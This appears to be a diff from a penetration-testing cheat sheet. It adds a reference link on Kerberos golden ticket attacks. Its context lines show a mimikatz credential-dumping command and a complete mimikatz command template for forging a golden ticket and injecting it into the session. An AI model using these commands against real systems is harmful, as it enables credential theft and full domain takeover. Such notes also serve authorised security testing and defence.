@@ -782,6 +782,7 @@ sekurlsa::logonPasswords full
 
 Generating a golden ticket on kerberos using mimikatz:  
 https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/  
+https://attack.stealthbits.com/how-golden-ticket-attack-works  
 
 ```
 mimikatz# kerberos::golden /admin:<USERNAME> /domain:<DOMAIN> /id:<FAKE_RID> /sid:<SID> /krbtgt:<NTLM_HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt
